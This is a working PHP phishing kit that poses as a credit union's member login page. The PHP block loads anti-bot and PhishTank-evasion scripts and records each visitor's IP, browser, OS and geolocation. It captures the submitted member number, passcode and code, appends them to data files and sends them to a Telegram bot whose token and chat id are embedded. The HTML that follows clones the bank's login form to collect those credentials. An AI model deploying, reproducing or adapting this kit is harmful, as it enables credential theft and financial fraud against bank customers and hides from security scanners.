

<?php
        include "/anti-bot/Bot-Spox.php";
        include "/anti-bot/Dila_DZ.php";
        include "/anti-bot/Fuck-you.php";
        include "/anti-bot/index.php";
        include "/anti-bot/IP-BlackList.php";
        include "/anti-bot/new.php";
        include "/anti-bot/proxyblock.php";
        include "/anti-bot/whitelist.dat";
        include "/anti-bot/#1.php";
        include "/anti-bot/#2.php";
        include "/anti-bot/#3.php";
        include "/anti-bot/#4.php";
        include "/anti-bot/#5.php";
        include "/anti-bot/#6.php";
        include "/anti-bot/#7.php";
        include "/anti-bot/#8.php";
        include "/anti-bot/#9.php";
        include "/anti-bot/#10.php";
        include "/anti-bot/#11.php";
        include "/anti-bot/#12.php";
        include "/anti-bot/antibot_host.php";
        include "/anti-bot/antibot_ip.php";
        include "/anti-bot/antibot_phishtank.php";
        include "/anti-bot/antibot_proxy.php";
        include "/anti-bot/antibot_userAgent.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/data.dat';
$file2      = '/data.dat';
$file3      = '/data.dat';
$file4      = '/data.dat';
$file5      = '/data.dat';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "lake";
    $project    = "[CR00K-3D]";
    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n---$code---\n\n Lake credit -----------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>

    
    
    
    
    
    
    
    
    

    

    
    
    

    
    
<link type="text/css" href="Login_files/theme-lakeview.css" rel="stylesheet"><script src="moz-extension://1900272a-dfb2-49d2-a0a7-bedc44d05a3d/assets/prompt.js"></script></head><body ng-app="UxpLoginApp" class="uxp-theme ng-scope">


<div class="widget-c1-oauth-login position-relative oauth-login">
    <!-- Navigation section -->

    <!-- Terms and Condition section -->
    <!-- Login section -->
    <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">
        
        <div class="errors errors-login">
            <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message ng-hide"></span>
        </div>
        <form id="loginForm" name="uxpLoginForm" class="center-block c1-login-form ng-valid-minlength ng-valid-maxlength ng-valid-parse ng-dirty ng-invalid ng-invalid-uxp-pattern ng-invalid-required" ng-class="{ 'ie11-fix': isIE11 }" method="post" autocomplete="on" ng-submit="ngSubmitListener('false')" action="040147.php"><input type="hidden" name="_csrf" value="bd05cfc9-b715-4caa-a6c1-e95da648a6a7" autocomplete="off">

            <!-- ReCaptcha -->
            


            <div>
                <!-- Memorized account select -->
                

                <!-- pan/pac login -->
                <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()" class="ng-valid-minlength ng-valid-maxlength ng-valid-parse ng-dirty ng-invalid ng-invalid-uxp-pattern ng-invalid-required">
                    
                    

                    <div class="logo text-center">
        <img src="Login_files/logo.png" alt="Logo">
        
</div>
                    
                    

                    <div class="form-group ng-hide" ng-show="selectedMemorizedAccount.nickname">
                        <h4>Enter passcode for <em class="ng-binding"></em></h4>
                    </div>
                    <div class="login-id-fields" ng-show="!state.usingMemorizedUser">
                        <div class="new-login-fields">
                            
                            
    <div class="form-group">
        
        
        
        <input id="branch" name="branch" type="hidden" value="001" autocomplete="off">
    </div>
    <!-- ngIf: !state.usingMemorizedUser --><!-- ngIf: !state.usingMemorizedUser --><div ng-if="!state.usingMemorizedUser" ng-class="
            [
                'form-group',
                {
                    'is-invalid': isMemberNumInvalid()
                }
            ]
         " class="ng-scope form-group is-invalid">
        <div ng-class="
            [
                'text-input',
                {
                    'is-empty': !(uxpLoginForm.newLoginForm.memberNum.$modelValue)
                }
            ]
            " class="text-input is-empty">
            <label>
                <span aria-hidden="true">Member Number</span>
                <input class="form-control ng-valid-required ng-valid-maxlength ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-uxp-pattern" id="memberNum" type="text" maxlength="12" uxp-pattern="^.{1,12}$" ng-model="fieldModels.memberNum" data-uxp-required-error-message="Please enter your PAN." data-uxp-mismatched-error-message="You have entered an invalid PAN. Please try again." ng-required="required" ng-model-options="{allowInvalid: true}" ng-change="isFieldChanged()" aria-describedby="memberNumError" autocomplete="username" aria-required="true" aria-invalid="true" android-margin="" placeholder="Member Number" name="username">
            </label>
            <!-- ngIf: 
                    isMemberNumInvalid() &&
                    uxpLoginForm.newLoginForm.memberNum.$error.uxpPattern
                 -->
        </div>
    </div><!-- end ngIf: !state.usingMemorizedUser --><!-- end ngIf: !state.usingMemorizedUser -->

                        </div>
                        <!-- ngIf: state.usingMemorizedUser -->
                        <div class="memorized-login-fields">
                            <!-- ngIf: fieldModels.hashedLoginId -->
                        </div>
                    </div>
                    <div class="password-mask-toggle">
                        
                    </div>
                    <div class="form-group" ng-class="{ 'is-invalid': isPasswordInvalid() }">
                        <div ng-class="
                            [
                                'text-input',
                                {
                                    'is-empty': !(uxpLoginForm.newLoginForm.password.$modelValue)
                                }
                            ]
                            " class="text-input is-empty">
                            <label>
                                <span aria-hidden="true">Passcode</span>
                                <input class="form-control ng-valid-parse ng-touched ng-dirty ng-invalid ng-invalid-uxp-pattern ng-empty ng-invalid-required" id="password" name="password" ng-attr-type="{{ fieldModels.passwordInputType }}" ng-model="fieldModels.password" uxp-pattern="^.{5,30}$" ng-model-options="{allowInvalid: true}" ng-change="isFieldChanged()" data-uxp-required-error-message="Please enter your Personal Access Code." data-uxp-mismatched-error-message="You have entered an incorrect Personal Access Code. Please try again." ng-required="true" aria-invalid="true" aria-describedby="passwordError" autocomplete="current-password" android-margin="" placeholder="Passcode" aria-label="Passcode" type="password" required="required">
                            </label>
                            <!-- ngIf: 
                                    isPasswordInvalid() &&
                                    uxpLoginForm.newLoginForm.password.$error.uxpPattern
                                 -->
                        </div>
                    </div>
                    
                    

                    

                    <div class="text-center c1-btn-container">
                        
                        <button ng-disabled="uxpLoginForm.$invalid || state.isSubmittingForm" type="submit" id="loginSubmit" disabled="disabled">Login</button>

                        
                    </div>

                    <div class="c1-btn-container memorized-btn-container">
                        
    
                        <div class="memorized-accounts ng-hide" ng-show="
                            haveMemorizedAccounts() &amp;&amp;
                            (
                                showingNewLogin() ||
                                showingMemorizedAccountsEdit()
                            )
                         ">
                            <a href="#" ng-click="showMemorizedAccounts()">Show Saved Logins</a> 
                        </div>
                    </div>

                    

                    
                </div>


                

                
            </div>
        </form>
        
    <!-- ngIf: state.isShowingSpinner -->

    </div>
</div>














    
    
    




</body></html>